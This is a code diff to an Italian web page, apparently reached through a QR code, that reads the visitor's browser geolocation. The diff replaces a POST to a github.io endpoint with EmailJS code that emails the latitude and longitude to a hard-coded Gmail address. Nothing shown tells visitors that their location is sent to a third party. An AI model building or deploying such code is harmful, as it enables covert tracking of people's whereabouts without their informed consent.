@@ -2,6 +2,12 @@
 <html>
 <head>
     <title>Rivela Posizione</title>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("service_ig15rg6"); // Sostituisci con il tuo user_id da EmailJS
+        })();
+    </script>
 </head>
 <body>
 <h1>La tua posizione attuale</h1>
@@ -16,20 +22,19 @@
 
         locationElement.innerHTML = "Latitudine: " + latitude + "<br>Longitudine: " + longitude;
 
-        // Invia la posizione al server
-        fetch('https://alessiopgg.github.io/qrcodeProject/add_location', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                latitude: latitude,
-                longitude: longitude
-            })
-        })
-            .then(response => response.json())
-            .then(data => console.log(data))
-            .catch(error => console.error('Errore:', error));
+        // Invia la posizione via email usando EmailJS
+        var templateParams = {
+            latitude: latitude,
+            longitude: longitude,
+            to_email: 'cilindromagico2.0@gmail.com' // Sostituisci con l'indirizzo email del destinatario
+        };
+
+        emailjs.send('TUO_SERVICE_ID', 'TUO_TEMPLATE_ID', templateParams)
+            .then(function(response) {
+                console.log('Email inviata correttamente!', response.status, response.text);
+            }, function(error) {
+                console.error('Errore nell\'invio dell\'email:', error);
+            });
     }
 
     function showError(error) {
